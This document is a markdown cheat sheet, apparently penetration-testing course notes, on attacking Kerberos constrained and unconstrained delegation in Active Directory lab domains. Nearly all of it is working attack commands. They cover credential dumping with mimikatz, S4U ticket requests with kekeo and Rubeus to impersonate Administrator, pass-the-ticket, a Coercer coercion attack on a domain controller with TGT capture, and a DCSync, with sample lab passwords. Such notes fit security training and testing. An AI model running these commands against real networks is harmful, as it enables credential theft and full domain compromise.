# Constrained vs Unconstrained

## Delegation configuration

#### 1) HTTP

#### 2) CIFS

#### 3) LDAP

#### 4) HOST

#### 5) MSSQL

# Constrained Delegation Exploitation 

## Example:

#### 1) Import-Module c:\tools\Powerview.ps1

#### 2) Get-NetUser -TrustedToAuth

#### 3) mimikatz.exe

#### 4) token::elevate

#### 5) lsadump::secrets (Pulls clear text credentials from registry hive)

#### 6) Exit mimikatz after "token::elevate" command

#### 7) kekeo.exe

#### 8) tgt::ask /user:USER/SERVICE /domain:DOMAIN /password:PASSWORD

#### 9) tgs::s4u /tgt:TICKET.KIRBI /user:USER /service:SERVICE *You can run same command to impersonate more services.

#### 10) mimikatz

#### 11) privilege::debug

#### 12) kerberos::ptt TICKET.KIRBI

#### 13) kerberos::ptt TICKET2.KIRBI

#### 14) klist

# Kerberos Constrained Delegation

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetUser -TrustedToAuth`                                 | Cmdlet used to enumerate user accounts that are trusted for delegation in the domain |
| `.\Rubeus.exe hash /password:Slavi123`                       | Converts the plaintext password `Slavi123` to its NTLM hash equivalent|
| `.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt` | Using Rubeus to request a ticket for the `Administrator` account, by way of the `webservice` user who is trusted for delegation |
| `Enter-PSSession dc1`                                        | Used to enter a new powershell remote session on the `dc1` computer |

# Coercing Attacks & Unconstrained Delegation

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetComputer -Unconstrained \| select samaccountname`       | PowerView command used to idenfity systems configred for Unconstrained Delegation. |
| `.\Rubeus.exe monitor /interval:1`                           | Used to monitor new logons and extract TGTs. |
| `Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local` | Used to perform a coercing attack towards DC1, forcing it to connect to WS001.
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |
